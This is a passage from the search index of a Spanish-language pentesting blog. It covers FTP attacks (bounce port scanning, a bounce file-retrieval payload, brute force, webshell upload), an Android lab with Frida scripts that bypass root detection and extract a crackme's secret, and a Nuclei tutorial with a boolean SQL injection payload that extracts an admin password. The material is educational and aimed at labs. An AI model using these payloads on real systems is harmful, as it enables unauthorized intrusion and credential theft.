conectado podemos realizar el escaneo de puertos mediante los comandos PORT y ERPT seguidos de un comando LIST .</p> <p>Aqu\u00ed tenemos un ejemplo para escanear el puerto 9091 del host 10.10.10.14</p> <pre><code>PORT 10,10,10,14,0,9091\nEPRT |2|10.10.10.14|9091|\n\nLIST\n</code></pre> <p>Si la respuesta es un 150 el puerto est\u00e1 abierto, en caso de recibir un 415 el puerto est\u00e1 cerrado.</p>","tags":["Ciberseguridad","Pentesting","FTP"]},{"location":"es/blog/posts/14-11-2024/#ftp-bounce-file-get","title":"FTP Bounce file get","text":"<p>Este ataque permite a un atacante descargar ficheros de un servidor FTP no accesible por el atacante, pero al que s\u00ed puede llegar un servidor FTP accesible por el atacante</p> <p></p> <p>Este ataque tiene los siguientes prerequisitos:</p> <ul> <li>Credenciales v\u00e1lidas para External FTP.</li> <li>Credenciales v\u00e1lidas para Internal FTP.</li> <li>Acceso de escritura para External FTP.</li> <li>Permisos de ejecuci\u00f3n del comando PORT tanto en External como en Internal.</li> </ul> <p>Primero que nada desplegaremos un servidor FTP en la m\u00e1quina del atacante, este servidor tiene que soportar el modo pasivo.</p> <p>Una vez desplegado abriremos una conexi\u00f3n pasiva con el comando PASV y le diremos que la guarde con STOR output.ext .</p> <p>Ahora crearemos un archivo con los comandos que queremos lanzar contra el segundo servidor, un ejemplo seria el siguiente:</p> <pre><code>user ftp   # Usuario para el servidor internal\npass password # Password para el servidor internal\ncwd /DIRECTORY\ntype i\nport F,F,F,F,X,X  #Nuestro puerto pasivo\nretr file.ext\nquit\n^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@ ... ^@^@^@^@\n^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@ ... ^@^@^@^@\n</code></pre> <p>Ahora lo subimos con PUT y desde el servidor externo ejecutamos los siguientes comandos:</p> <pre><code>put payload\nquote \"port C,C,C,C,0,21\" # IP del servidor interno\nquote \"retr payload\"\n</code></pre> <p>Tras esto tendremos el archivo file.ext en nuestro servidor como output.ext</p>","tags":["Ciberseguridad","Pentesting","FTP"]},{"location":"es/blog/posts/14-11-2024/#ataque-por-fuerza-bruta","title":"Ataque por fuerza bruta","text":"<p>Muchos de los servidores FTP no presentan protecci\u00f3n contra ataques por fuerza bruta. Teniendo un usuario o una lista de ellos podemos llevar a cabo un ataque de fuerza bruta con diferentes credenciales obtenidas de diversas fuentes, si bien existen varias herramientas para este fin, las dos m\u00e1s comunes son NetExec e Hydra. </p>","tags":["Ciberseguridad","Pentesting","FTP"]},{"location":"es/blog/posts/14-11-2024/#backup-sorpresa","title":"Backup sorpresa","text":"<p>Esto no es un ataque per se, pero es bastante \u00fatil, ya que nos permite descargar todos los archivos accesibles del servidor mediante un solo comando.</p> <pre><code>wget -r ftp://IP/dir/* --ftp-user=username --ftp-password=password\n</code></pre>","tags":["Ciberseguridad","Pentesting","FTP"]},{"location":"es/blog/posts/14-11-2024/#ftp-file-upload-to-rce","title":"FTP file upload to RCE","text":"<p>En determinadas circunstancias, el permiso para subir ficheros al servidor junto a otras malas configuraciones puede llevar a la obtenci\u00f3n de ejecuci\u00f3n remota de comandos en el servidor.</p> <p>El caso m\u00e1s com\u00fan es la posibilidad de subir ficheros que van a ser luego servidos por un servidor web, donde podr\u00edamos subir una webshell interpretable por el servidor para lograr obtener ejecuci\u00f3n de comandos.</p>","tags":["Ciberseguridad","Pentesting","FTP"]},{"location":"es/blog/posts/14-11-2024/#sniffing-credentials","title":"Sniffing credentials","text":"<p>Dado que FTP funciona por defecto en texto plano, es posible para un atacante en la misma red usar un sniffer y capturar tanto las credenciales como la conversaci\u00f3n FTP.</p> <p>En el pr\u00f3ximo art\u00edculo de esta serie sobre FTP hablaremos sobre fallos comunes de implementaci\u00f3n y algunas vulnerabilidades conocidas de algunas implementaciones del protocolo.</p> <p>Stay safe. Stay smart. Stay secure.</p>","tags":["Ciberseguridad","Pentesting","FTP"]},{"location":"es/blog/posts/15-12-2024/","title":"Instalaci\u00f3n y Configuraci\u00f3n de Herramientas de An\u00e1lisis en Android","text":"<p>Este art\u00edculo describe los pasos necesarios para crear un entorno de pruebas din\u00e1mico en Linux/Debian, detallando c\u00f3mo integrar herramientas como Burp Suite, Frida y Objection, y sus prop\u00f3sitos espec\u00edficos. Tambi\u00e9n cubre procedimientos para gestionar certificados en un emulador de Android y configurar un entorno de pruebas din\u00e1mico. Sigue las instrucciones detalladas para lograr una configuraci\u00f3n funcional y lista para el an\u00e1lisis.</p>","tags":["Cybersecurity","Pentesting","Android","Burpsuite","VM"]},{"location":"es/blog/posts/15-12-2024/#instalar-de-android-studio","title":"Instalar de Android Studio","text":"<p>Android Studio sirve como el IDE principal para el desarrollo y pruebas de aplicaciones Android, ofrece un entorno para la creaci\u00f3n, emulaci\u00f3n y depuraci\u00f3n de aplicaciones, vamos a utilizar esto para una f\u00e1cil descarga e instalaci\u00f3n de avds.</p>","tags":["Cybersecurity","Pentesting","Android","Burpsuite","VM"]},{"location":"es/blog/posts/15-12-2024/#paso-1-descargar-android-studio","title":"Paso 1: Descargar Android Studio","text":"<ol> <li>Descarga el archivo ZIP de Android Studio desde la web oficial Android Studio.</li> </ol>","tags":["Cybersecurity","Pentesting","Android","Burpsuite","VM"]},{"location":"es/blog/posts/15-12-2024/#paso-2-extraccion-y-configuracion","title":"Paso 2: Extracci\u00f3n y Configuraci\u00f3n","text":"<p>Extrae el archivo descargado:</p> <pre><code>unzip android-studio-*.zip -d ~/android-studio\n</code></pre>","tags":["Cybersecurity","Pentesting","Android","Burpsuite","VM"]},{"location":"es/blog/posts/15-12-2024/#paso-3-crear-enlaces-simbolicos","title":"Paso 3: Crear Enlaces Simb\u00f3licos","text":"<p>Para agilizar el uso de Android Studio y del emulador, creamos los enlaces simb\u00f3licos:</p> <pre><code>sudo ln -s ~/android-studio/bin/studio.sh /usr/local/bin/androidStudio\nsudo ln -s ~/android-studio/emulator/emulator /usr/local/bin/androidEmulator\n</code></pre> <p>Ahora, puedes ejecutar Android Studio con:</p> <pre><code>androidStudio\n</code></pre> <p>Y el emulador con:</p> <pre><code>androidEmulator\n</code></pre>","tags":["Cybersecurity","Pentesting","Android","Burpsuite","VM"]},{"location":"es/blog/posts/15-12-2024/#paso-4-usar-un-dispositivo-fisico-opcional","title":"Paso 4: Usar un dispositivo f\u00edsico (Opcional)","text":"<p>Aunque esta gu\u00eda una principalmente un emulador de Android, puedes optar por utilizar un dispositivo f\u00edsico para una experiencia m\u00e1s realista. Esto requiere habilitar las opciones de desarrollador y usar la depuraci\u00f3n USB en tu dispositivo:</p> <ol> <li>Habilita Opciones de Desarrollador:</li> <li> <p>Ve a Ajustes &gt; Acerca del tel\u00e9fono y pincha el N\u00famero de compilaci\u00f3n varias veces hasta que se activen las opciones de desarrollador.</p> </li> <li> <p>Habilita la Depuraci\u00f3n USB:</p> </li> <li>En Ajustes &gt; Opciones Desarrollador, habilita Depuraci\u00f3n USB.</li> </ol> <p>Conecta tu dispositivo al ordenador a trav\u00e9s del puerto USB. Ahora puedes utilizar los comandos <code>abd</code> para instalar, depurar aplicaciones y realizar las mismas pruebas en que con el emulador.</p>","tags":["Cybersecurity","Pentesting","Android","Burpsuite","VM"]},{"location":"es/blog/posts/15-12-2024/#instalar-certificados-burp-en-un-emulador-android","title":"Instalar  Certificados Burp en un Emulador Android","text":"<p>Burp Suite es utilizado para interceptar y analizar el tr\u00e1fico entre aplicaciones Android y los servidores backend. Instalar estos certificados nos permitir\u00e1 descifrar el tr\u00e1fico HTTPS para analizarlo.</p>","tags":["Cybersecurity","Pentesting","Android","Burpsuite","VM"]},{"location":"es/blog/posts/15-12-2024/#paso-1-inicia-el-emulador-con-un-sistema-escribible","title":"Paso 1: Inicia el Emulador con un Sistema Escribible","text":"<ol> <li>Lista los AVDs (Android Virtual Devices) con la opci\u00f3n <code>-list-avds</code>: <pre><code>androidEmulator -list-avds\n</code></pre></li> <li>Inicia el emulador con la opci\u00f3n <code>-writable-system</code>: <pre><code>androidEmulator -avd &lt;avd_name&gt; -writable-system\n</code></pre></li> </ol>","tags":["Cybersecurity","Pentesting","Android","Burpsuite","VM"]},{"location":"es/blog/posts/15-12-2024/#paso-2-exporta-el-certificado-desde-burp-suite","title":"Paso 2: Exporta el Certificado desde Burp Suite","text":"<ol> <li>Desde Burp Suite, exporta el certificado en formado DER:</li> <li>Ve a Proxy &gt; Opciones &gt; Import/Export CA certificate.</li> <li>Exporta el archivo como <code>burp-cert.der</code>.</li> </ol>","tags":["Cybersecurity","Pentesting","Android","Burpsuite","VM"]},{"location":"es/blog/posts/15-12-2024/#paso-3-convierte-y-copia-el-certificado-en-el-emulador","title":"Paso 3: Convierte y Copia el Certificado en el Emulador","text":"<ol> <li> <p>Convierte el certificado DER al formato PEM: <pre><code>openssl x509 -inform DER -in burp-cert.der -out burp-cert.pem\n</code></pre></p> </li> <li> <p>Obt\u00e9n el hash del certificado: <pre><code>openssl x509 -inform PEM -subject_hash_old -in burp-cert.pem | head -1\n</code></pre></p> </li> <li> <p>Renombra el certificado usando su hash: <pre><code>mv burp-cert.pem 9a5ba575.0\n</code></pre></p> </li> <li> <p>Env\u00eda el certificado al emulador: <pre><code>adb root\nadb remount\nadb push 9a5ba575.0 /sdcard/\nadb shell mv /sdcard/9a5ba575.0 /system/etc/security/cacerts/\nadb shell chmod 644 /system/etc/security/cacerts/9a5ba575.0\n</code></pre></p> </li> </ol>","tags":["Cybersecurity","Pentesting","Android","Burpsuite","VM"]},{"location":"es/blog/posts/15-12-2024/#paso-4-verificacion","title":"Paso 4: Verificaci\u00f3n","text":"<p>Reinicia el emulador y verifica la instalaci\u00f3n comprobando Ajustes &gt; Seguridad &gt; Credenciales de confianza para el certificado \"PortSwigger CA\".</p>","tags":["Cybersecurity","Pentesting","Android","Burpsuite","VM"]},{"location":"es/blog/posts/15-12-2024/#instalar-frida-y-objection-en-un-entorno-virtual-en-python","title":"Instalar Frida y Objection en un Entorno Virtual en Python","text":"<p>Frida es un conjunto de herramientas de instrumentaci\u00f3n din\u00e1mica para la depuraci\u00f3n, pruebas e ingenier\u00eda inversa para aplicaciones Android. Objection es una envoltura para Frida que simplifica la evaluaci\u00f3n de seguridad automatizando tareas de pruebas comunes.</p>","tags":["Cybersecurity","Pentesting","Android","Burpsuite","VM"]},{"location":"es/blog/posts/15-12-2024/#paso-1-creamos-un-entorno-virtual","title":"Paso 1: Creamos un Entorno Virtual","text":"<ol> <li> <p>Creamos un Entorno Virtual en Python para aislar las dependencias de la herramienta: <pre><code>python3 -m venv frida-env\n</code></pre></p> </li> <li> <p>Activamos el entorno virtual: <pre><code>source frida-env/bin/activate\n</code></pre></p> </li> </ol>","tags":["Cybersecurity","Pentesting","Android","Burpsuite","VM"]},{"location":"es/blog/posts/15-12-2024/#paso-2-instalamos-frida-y-objection","title":"Paso 2: Instalamos Frida y Objection","text":"<ol> <li>Instalamos ambas aplicaciones con <code>pip</code>: <pre><code>pip install frida-tools objection\n</code></pre></li> </ol>","tags":["Cybersecurity","Pentesting","Android","Burpsuite","VM"]},{"location":"es/blog/posts/15-12-2024/#configurando-frida-server-en-el-emulador","title":"Configurando Frida-Server en el Emulador","text":"<p>El Servidor Frida facilita la comunicaci\u00f3n entre el cliente Frida de su m\u00e1quina host y el emulador Android para la instrumentaci\u00f3n de aplicaciones.</p>","tags":["Cybersecurity","Pentesting","Android","Burpsuite","VM"]},{"location":"es/blog/posts/15-12-2024/#paso-1-descargamos-el-archivo-frida-server","title":"Paso 1: Descargamos el archivo Frida-Server","text":"<ol> <li> <p>Descarga el binario <code>frida-server</code> desde la web oficial de Frida</p> </li> <li> <p>Extrae el archivo descargado.</p> </li> </ol>","tags":["Cybersecurity","Pentesting","Android","Burpsuite","VM"]},{"location":"es/blog/posts/15-12-2024/#paso-2-sube-y-configura-frida-server-en-el-emulador","title":"Paso 2: Sube y Configura Frida-Server en el Emulador","text":"<ol> <li>Sube el binario <code>frida-server</code> al emulador: <pre><code>adb push frida-server /data/local/tmp/\nadb shell chmod 755 /data/local/tmp/frida-server\n</code></pre></li> <li>Inicia el servidor Frida: <pre><code>adb shell /data/local/tmp/frida-server &amp;\n</code></pre></li> </ol>","tags":["Cybersecurity","Pentesting","Android","Burpsuite","VM"]},{"location":"es/blog/posts/15-12-2024/#paso-3-verificacion","title":"Paso 3: Verificaci\u00f3n","text":"<p>Garantiza que Frida est\u00e1 funcionando listando los procesos del emulador:</p> <pre><code>frida-ps -U\n</code></pre>","tags":["Cybersecurity","Pentesting","Android","Burpsuite","VM"]},{"location":"es/blog/posts/15-12-2024/#inspeccion-de-metodos-revisiting-crackme-1","title":"Inspecci\u00f3n de M\u00e9todos: Revisiting Crackme 1","text":"<p>Para demostrar el poder del an\u00e1lisis din\u00e1mico, utilizaremos la APK \"Uncrackable1\" para explorar c\u00f3mo estas t\u00e9cnicas pueden ser aplicadas en esta pr\u00e1ctica.</p>","tags":["Cybersecurity","Pentesting","Android","Burpsuite","VM"]},{"location":"es/blog/posts/15-12-2024/#explorando-la-aplicacion-con-apklab","title":"Explorando la Aplicaci\u00f3n con APKLab","text":"<p>Para entender mejor la aplicaci\u00f3n, decompile el APK para mostrar su c\u00f3digo fuente Java utilizando la extensi\u00f3n APKLab de Visual Studio Code. Esta extensi\u00f3n integra herramientas como JADX para simplificar el proceso.</p>","tags":["Cybersecurity","Pentesting","Android","Burpsuite","VM"]},{"location":"es/blog/posts/15-12-2024/#paso-1-configurar-apklab","title":"Paso 1: Configurar APKLab","text":"<ol> <li>Instala APKLab desde el mercado de extensiones de Visual Studio Code.</li> <li>Abre el archivo APK en APKLab para descompilar autom\u00e1ticamente la aplicaci\u00f3n y mostrar el c\u00f3digo.</li> </ol> Extensi\u00f3n APK Lab para Visual Studio Code","tags":["Cybersecurity","Pentesting","Android","Burpsuite","VM"]},{"location":"es/blog/posts/15-12-2024/#paso-2-localizar-el-codigo-de-deteccion-desde-la-raiz","title":"Paso 2: Localizar el c\u00f3digo de detecci\u00f3n desde la ra\u00edz","text":"<ol> <li> <p>Usa la funcionalidad de buscar en APKLab para localizar el c\u00f3digo responsable de la detecci\u00f3n de la ra\u00edz mediante la b\u00fasqueda de frases como \"Root detected\".</p> </li> <li> <p>Navega por la implementaci\u00f3n pulsando en los resultados buscados.</p> </li> </ol>","tags":["Cybersecurity","Pentesting","Android","Burpsuite","VM"]},{"location":"es/blog/posts/15-12-2024/#eludir-la-deteccion-root","title":"Eludir la Detecci\u00f3n Root","text":"<p>Podemos eludir la detecci\u00f3n root modificando lo que devuelve los m\u00e9todos como <code>c.a()</code>, <code>c.b()</code>, y <code>c.c()</code>. Alternativamente, podemos cambiar la implementaci\u00f3n del m\u00e9todo <code>onClick()</code> en <code>MainActivity</code>, que cierra la aplicaci\u00f3n cuando pulsamos \"OK\" en una alerta.</p>","tags":["Cybersecurity","Pentesting","Android","Burpsuite","VM"]},{"location":"es/blog/posts/15-12-2024/#usando-frida-para-la-instrumentacion-de-la-aplicacion","title":"Usando Frida para la Instrumentaci\u00f3n de la Aplicaci\u00f3n","text":"","tags":["Cybersecurity","Pentesting","Android","Burpsuite","VM"]},{"location":"es/blog/posts/15-12-2024/#paso-1-buscamos-el-id-del-proceso-de-frida","title":"Paso 1: Buscamos el ID del proceso de Frida","text":"<p>Listamos los procesos para localizar la aplicaci\u00f3n:</p> <pre><code>frida-ps -Ua\n</code></pre>","tags":["Cybersecurity","Pentesting","Android","Burpsuite","VM"]},{"location":"es/blog/posts/15-12-2024/#paso-2-adjuntamos-el-proceso-y-enumeramos-los-metodos","title":"Paso 2: Adjuntamos el Proceso y Enumeramos los m\u00e9todos","text":"<p>Creamos un script para listar los m\u00e9todos de la aplicaci\u00f3n: <pre><code>// listmethods.js\nJava.perform(() =&gt; {\n  const groups = Java.enumerateMethods(\"*MainActivity*!onCl*\");\n  console.log(JSON.stringify(groups, null, 2));\n});\n</code></pre> Adjuntamos el proceso y ejecutamos el script:</p> <pre><code>frida -U &lt;PID&gt; -l listmethods.js\n</code></pre>","tags":["Cybersecurity","Pentesting","Android","Burpsuite","VM"]},{"location":"es/blog/posts/15-12-2024/#paso-3-modificacion-de-la-implementacion-del-metodo","title":"Paso 3: Modificaci\u00f3n de la Implementaci\u00f3n del m\u00e9todo","text":"<p>Usa Frida para modificar el m\u00e9todo <code>onClick()</code>: <pre><code>// override.js\nJava.perform(() =&gt; {\n  const main = Java.use('sg.vantagepoint.uncrackable1.MainActivity$1');\n  main.onClick.implementation = function () {\n    console.log('Pwned!');\n  };\n});\n</code></pre></p> <p>Ejecuta el script y verifica que presionando \"OK\" la aplicaci\u00f3n no se cierra.</p>","tags":["Cybersecurity","Pentesting","Android","Burpsuite","VM"]},{"location":"es/blog/posts/15-12-2024/#extraccion-de-la-passphrase-secreta","title":"Extracci\u00f3n de la passphrase secreta","text":"<p>Inspecciona el c\u00f3digo m\u00e1s a fondo para buscar la funci\u00f3n responsable de descifrar la frase de contrase\u00f1a (passphrase) secreta. Registra la salida del descifrado utilizando Frida:</p> <pre><code>// logDecryptor.js\nJava.perform(() =&gt; {\n  const AESDecryptor = Java.use(\"sg.vantagepoint.a.a\");\n  AESDecryptor[\"a\"].implementation = function (bArr, bArr2) {\n    console.log(`AESDecryptor.decrypt is called: bArr=${bArr}, bArr2=${bArr2}`);\n    const result = this[\"a\"](bArr, bArr2);\n    console.log(`AESDecryptor.decrypt result=${result}`);\n    return result;\n  };\n});\n</code></pre> <p>Convierte la matriz de bytes de salida en una string utilizando Python para revelar la frase secreta.</p> <p>Con esta configuraci\u00f3n, Android Studio permite la emulaci\u00f3n y depuraci\u00f3n de aplicaciones, Burp Suite facilita la interceptaci\u00f3n y el an\u00e1lisis del tr\u00e1fico, Frida permite la instrumentaci\u00f3n din\u00e1mica de la aplicaci\u00f3n, y Objection automatiza tareas comunes de pruebas de seguridad. La secci\u00f3n a\u00f1adida de an\u00e1lisis din\u00e1mico demuestra la aplicaci\u00f3n pr\u00e1ctica de estas herramientas para extraer secretos y eludir protecciones, lo que convierte esta gu\u00eda en un recurso completo para las pruebas de seguridad de aplicaciones m\u00f3viles.</p> <p>Stay safe. Stay smart. Stay secure.</p>","tags":["Cybersecurity","Pentesting","Android","Burpsuite","VM"]},{"location":"es/blog/posts/16-02-2025/","title":"Introducci\u00f3n a las Plantillas de Nuclei","text":"","tags":["Ciberseguridad","Pentesting","Nuclei","Automatizaci\u00f3n","Plantilla"]},{"location":"es/blog/posts/16-02-2025/#como-funcionan-las-plantillas","title":"Como funcionan las plantillas","text":"<p>En este articulo, Exploraremos como funcionan las plantillas de Nuclei , detallando el proceso de creaci\u00f3n y configuraci\u00f3n de vulnerabilidades personalizadas. Aprender\u00e1s los fundamentos, desde la configuraci\u00f3n de la informaci\u00f3n b\u00e1sica y la elaboraci\u00f3n de peticiones HTTP precisas hasta el uso de variables, payloads, matchers y extractors para pruebas din\u00e1micas. Adem\u00e1s, un ejemplo pr\u00e1ctico demuestra c\u00f3mo simular un servidor vulnerable y detectar una vulnerabilidad utilizando una plantilla personalizada Nuclei.</p>","tags":["Ciberseguridad","Pentesting","Nuclei","Automatizaci\u00f3n","Plantilla"]},{"location":"es/blog/posts/16-02-2025/#que-es-una-plantilla-de-nuclei","title":"\u00bfQue es una plantilla de Nuclei?","text":"<p>Una plantilla de Nuclei es un archivo con formato YAML que, rellenando secciones espec\u00edficas, permite estandarizar y automatizar la detecci\u00f3n de vulnerabilidades sin tener que reescribir c\u00f3digo cada vez. En este art\u00edculo, trabajaremos con el protocolo m\u00e1s com\u00fan para las plantillas: HTTP.</p> <ul> <li>Informaci\u00f3n b\u00e1sica: Identificador, nombre, autor, criticidad y descripci\u00f3n.</li> <li>Requests: Configuraci\u00f3n de las solicitudes HTTP que se enviar\u00e1n al activo.</li> <li>Matchers: Condiciones que deben cumplirse en la respuesta para determinar si la vulnerabilidad est\u00e1 presente.</li> <li>Extractors (Opcional): Herramientas para extraer y mostrar informaci\u00f3n adicional de la respuesta.</li> </ul>","tags":["Ciberseguridad","Pentesting","Nuclei","Automatizaci\u00f3n","Plantilla"]},{"location":"es/blog/posts/16-02-2025/#explicacion-de-las-partes-de-la-plantilla","title":"Explicaci\u00f3n de las partes de la plantilla","text":"","tags":["Ciberseguridad","Pentesting","Nuclei","Automatizaci\u00f3n","Plantilla"]},{"location":"es/blog/posts/16-02-2025/#seccion-de-informacion-info","title":"Secci\u00f3n de informaci\u00f3n (info)","text":"<p>Esta secci\u00f3n agrega informaci\u00f3n a la plantilla utilizando campos de metadatos:</p> <ul> <li>id: Identificador \u00fanico de la plantilla.</li> <li>severity: Indica la criticidad de la vulnerabilidad (por ejemplo, baja, media, alta, cr\u00edtica).</li> <li>referencia: URL a la documentaci\u00f3n, por ejemplo, la entrada CVE o recursos externos.</li> <li>tags: Palabras clave que facilitan la b\u00fasqueda y la clasificaci\u00f3n.</li> </ul> <p>Ejemplo:</p> <pre><code>id: id-ejemplo-vulnerabilidad\ninfo:\n  name: \"Ejemplo de vulnerabilidad gen\u00e9rica\"\n  author: \"NombreAutor\"\n  severity: \"medium\"\n  description: \"Detecta una vulnerabilidad gen\u00e9rica en una aplicaci\u00f3n web.\"\n  reference:\n    - \"https://ejemplo.com/detalles-vulnerabilidad\"\n  tags: [\"ejemplo\", \"web\", \"vulnerabilidad\"]\n</code></pre>","tags":["Ciberseguridad","Pentesting","Nuclei","Automatizaci\u00f3n","Plantilla"]},{"location":"es/blog/posts/16-02-2025/#definicion-de-la-solicitud","title":"Definici\u00f3n de la solicitud","text":"<p>Para plantillas basadas en HTTP, esta secci\u00f3n especifica las peticiones HTTP a ejecutar:</p> <ul> <li>method: m\u00e9todo HTTP (por ejemplo, GET, POST, PUT, DELETE).</li> <li>path: Punto(s) final(es) de destino, que pueden incluir variables din\u00e1micas (por ejemplo, <code>{{BaseURL}}</code>).</li> <li>headers, body, timeout, retries: Par\u00e1metros adicionales de la solicitud.</li> </ul> <p>Example:</p> <pre><code>requests:\n  - method: POST\n    path:\n      - \"{{BaseURL}}/api/login\"\n    headers:\n      Content-Type: \"application/json\"\n      User-Agent: \"Mozilla/5.0 (compatible; Nuclei)\"\n    body: '{\"username\": \"admin\", \"password\": \"admin\"}'\n    timeout: 5\n    retries: 2\n</code></pre>","tags":["Ciberseguridad","Pentesting","Nuclei","Automatizaci\u00f3n","Plantilla"]},{"location":"es/blog/posts/16-02-2025/#variables-y-placeholders","title":"Variables y Placeholders","text":"<p>Variables pueden ser variables predefinidas o personalizadas para permitir una configuraci\u00f3n din\u00e1mica:</p> <ul> <li>Variables predefinidas: por ejemplo, <code>{{BaseURL}}</code> resuelve autom\u00e1ticamente al host de destino.</li> <li>Variables personalizadas: Valores definidos por el usuario que pueden reutilizarse en varias secciones.</li> <li>Funciones: Las variables pueden incorporar funciones (por ejemplo, <code>base64_decode(\u00abQXRsYW5zZWMK\u00bb)</code>) para modificar los datos en tiempo de ejecuci\u00f3n.</li> </ul> <p>Protocolos soportados: dns, http, headless, y network.</p>","tags":["Ciberseguridad","Pentesting","Nuclei","Automatizaci\u00f3n","Plantilla"]},{"location":"es/blog/posts/16-02-2025/#payloads","title":"Payloads","text":"<p>Payloads permiten realizar pruebas de inyecci\u00f3n o de fuerza bruta definiendo listas de valores, como cadenas, caracteres especiales o patrones. Cada payload se itera y se inyecta en los par\u00e1metros de solicitud designados.</p> <p>Ejemplo:</p> <pre><code>payloads:\n  usernames:\n    - admin\n    - root\n</code></pre> <pre><code>payloads:\n  usernames:\n    file: \"payloads/usernames.txt\"\n</code></pre> <p>Estos valores se referencian en las solicitudes utilizando marcadores de posici\u00f3n (por ejemplo, <code>{{username}}</code>).</p>","tags":["Ciberseguridad","Pentesting","Nuclei","Automatizaci\u00f3n","Plantilla"]},{"location":"es/blog/posts/16-02-2025/#matchers","title":"Matchers","text":"<p>Matchers validan partes de la respuesta del protocolo utilizando diferentes t\u00e9cnicas. Hay siete tipos principales de matchers:</p> <ul> <li>status: Compara los c\u00f3digos de estado HTTP.</li> <li>size: Valida la longitud del contenido.</li> <li>word: Busca palabras o frases espec\u00edficas.</li> <li>regex: Compara texto usando expresiones regulares.</li> <li>binary: Detecta secuencias hexadecimales o binarias.</li> <li>dsl: Eval\u00faa expresiones mediante un lenguaje espec\u00edfico del dominio para condiciones complejas (muy pr\u00e1ctico y utilizado).</li> <li>xpath: Extrae datos de XML/HTML estructurado usando XPath.</li> </ul> <p>Los Matchers pueden combinarse con condiciones l\u00f3gicas (AND/OR), y los emparejadores negativos pueden especificarse utilizando <code>negative: true</code>.</p>","tags":["Ciberseguridad","Pentesting","Nuclei","Automatizaci\u00f3n","Plantilla"]},{"location":"es/blog/posts/16-02-2025/#extractors","title":"Extractors","text":"<p>Extractors capturan datos espec\u00edficos de las respuestas para su posterior procesamiento o reutilizaci\u00f3n. Incluyen:</p> <ul> <li>regex: Utiliza expresiones regulares para extraer patrones.</li> <li>kval: Recupera pares clave-valor de cabeceras o cookies.</li> <li>json: Aplica sintaxis JQ para extraer datos de las respuestas en formato JSON.</li> <li>xpath: Utiliza XPath para extraer elementos o atributos de HTML/XML.</li> <li>dsl: Eval\u00faa expresiones para calcular valores (por ejemplo, longitud del cuerpo).</li> </ul> <p>Los extractors din\u00e1micos (con <code>internal: true</code>) capturan valores en tiempo de ejecuci\u00f3n, como tokens CSRF, para su uso en peticiones posteriores.</p>","tags":["Ciberseguridad","Pentesting","Nuclei","Automatizaci\u00f3n","Plantilla"]},{"location":"es/blog/posts/16-02-2025/#funciones-avanzadas","title":"Funciones avanzadas","text":"<ul> <li>Solicitudes m\u00faltiples: Encadena varias peticiones HTTP para simular interacciones de varios pasos (por ejemplo, extraer un token CSRF de una petici\u00f3n GET para utilizarlo en una petici\u00f3n POST posterior).</li> <li>Scripts personalizados: Procesa en l\u00ednea los valores extra\u00eddos (por ejemplo, convierta un token a min\u00fasculas antes de reutilizarlo).</li> <li>Modos de ataque: Defina estrategias de inyecci\u00f3n de carga \u00fatil como battering ram, clusterbomb o pitchfork.</li> </ul>","tags":["Ciberseguridad","Pentesting","Nuclei","Automatizaci\u00f3n","Plantilla"]},{"location":"es/blog/posts/16-02-2025/#guia-practica-servidor-web-vulnerable-y-plantilla-de-nuclei","title":"Gu\u00eda pr\u00e1ctica: Servidor Web Vulnerable y Plantilla de Nuclei","text":"","tags":["Ciberseguridad","Pentesting","Nuclei","Automatizaci\u00f3n","Plantilla"]},{"location":"es/blog/posts/16-02-2025/#iniciar-el-docker-vulnerable","title":"Iniciar el docker vulnerable","text":"<p>Vamos a utilizar este servidor con vulnerabilidades conocidas para probar y practicar nuestros nuevos conocimientos adquiridos sobre plantillas Nuclei.</p> <p>Para iniciar el docker: <code>docker run -p 1234:8000 -it appsecco/dsvw</code></p> <p>Una vez iniciado, puedes acceder a \u00e9l y ver un par de vulnerabilidades para probar y crear plantillas. La primera es el siguiente ejemplo:</p> <p>En este primer ejemplo hay una inyeccion SQL de tipo booleano que puede ser detectada debido a a que cuando la query se da un valor de true la tabla se llena y cuando la query da un valor negativo no, usando el matcher dsl para mirar la longitud del cuerpo de la respuesta podemos saber si esta inyeccion SQL de tipo booleano esta presente en el activo. </p>","tags":["Ciberseguridad","Pentesting","Nuclei","Automatizaci\u00f3n","Plantilla"]},{"location":"es/blog/posts/16-02-2025/#crear-una-plantilla-de-nuclei-para-detectar-la-boolean-sqli","title":"Crear una plantilla de Nuclei para detectar la boolean SQLI","text":"<p>Para averiguar la longitud de la contrase\u00f1a, utilizaremos un payload (de 1 a 9) codificado en la plantilla, aunque tambi\u00e9n se podr\u00eda utilizar un archivo con mas payloads para hacerlo m\u00e1s din\u00e1mico.</p> <p>Creamos un archivo llamado algo as\u00ed como <code>BSQLI-dsvw.yaml</code> con el siguiente contenido:</p> <pre><code>id: boolean-sqli-password-extract\ninfo:\n  name: SQLite Boolean-Based SQL Injection - Password Extraction\n  author: yourName\n  severity: critical\n  tags: [\"sqli\",\"sqlite\",\"boolean-based\"]\n\nhttp:\n  - method: GET\n    path:\n      - \"{{BaseURL}}?id=2%20AND%20SUBSTR((SELECT%20password%20FROM%20users%20WHERE%20name%3D%27admin%27)%2C1%2C1)%3D%27{{length}}%27\"\n\n    payloads:\n      length:\n        - 1\n        - 2\n        - 3\n        - 4\n        - 5\n        - 6\n        - 7\n        - 8\n        - 9\n    matchers-condition: and\n    matchers:\n      - type: dsl\n        dsl:\n          - \"len(body)&gt;1350 &amp;&amp; status_code==200\"\n</code></pre>","tags":["Ciberseguridad","Pentesting","Nuclei","Automatizaci\u00f3n","Plantilla"]},{"location":"es/blog/posts/16-02-2025/#ejecutar-nuclei-con-la-plantilla","title":"Ejecutar Nuclei con la plantilla","text":"<p>Con el servidor funcionando en <code>http://localhost:1234</code>, abre otro terminal y ejecuta:</p> <pre><code>nuclei -u http://localhost:8000 -t BSQLI-dsvw.yaml\n</code></pre> <p>Nuclei enviar\u00e1 una petici\u00f3n al servidor y al encontrar la longitud correcta, mostrar\u00e1 un resultado indicando que la prueba se ha realizado correctamente y el payload que corresponde a la longitud de la contrase\u00f1a.</p>","tags":["Ciberseguridad","Pentesting","Nuclei","Automatizaci\u00f3n","Plantilla"]},{"location":"es/blog/posts/16-02-2025/#conclusion","title":"Conclusi\u00f3n","text":"<p>Ya seas un bughunter, trabajes como pentester o incluso trabajando desde el lado defensivo, tener Nuclei en tu arsenal de herramientas te har\u00e1 m\u00e1s eficaz en tu trabajo y te permitir\u00e1 enfocarte en vulnerabilidades m\u00e1s complejas de detectar.</p> <p>Este ejemplo se ha realizado con plantillas b\u00e1sicas, pero se puede ir mucho m\u00e1s all\u00e1. Puedes crear tus propias plantillas 